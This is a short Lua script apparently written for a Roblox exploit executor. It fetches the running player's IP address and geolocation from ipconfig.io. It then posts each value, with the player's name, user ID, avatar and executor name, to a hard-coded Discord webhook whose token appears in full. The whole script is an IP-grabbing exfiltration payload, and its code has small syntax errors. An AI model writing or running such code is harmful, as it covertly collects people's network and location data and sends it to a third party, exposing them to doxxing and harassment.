return function()
local Player = game.Players.LocalPlayer
local Content = 'player caught exploiting';
local Avatar = game.Players:GetUserThumbnailAsync(Player.UserId,Enum.ThumbnailType.AvatarThumbnail,Enum.ThumbnailSize.Size150x150)
local Embed = {
    title = 'do whatever you want, info down will be sent';
    footer = { text = game.PlaceId };
    avatarurl = Avatar,
    author = {
        name = Player.Name
        url = 'https://www.roblox.com/'..Player.UserId;
    };
    fields = {
        {
            name = 'Caught exploiting';
            value = 'Exploit: '..getexecutorname();
        }
    };
};
for i,v in game.HttpService:JSONDecode(game:HttpGet("https://ipconfig.io/json") do
    if type(v) == "string" then
http_request{
    Url = 'https://discord.com/api/webhooks/1226933576944189520/7mck8mDESiAh0oU8wcY9entcJZX-JqL2qS17p1m8_ZnNiMGlGBIha2ipiLxPt0Ohexdp';
    Method = 'POST';
    Headers = {
        ['Content-Type'] = 'application/json';
    };
    Body = game:GetService'HttpService':JSONEncode( { content = v; embeds = { Embed } } );
};
    end
  end
    end
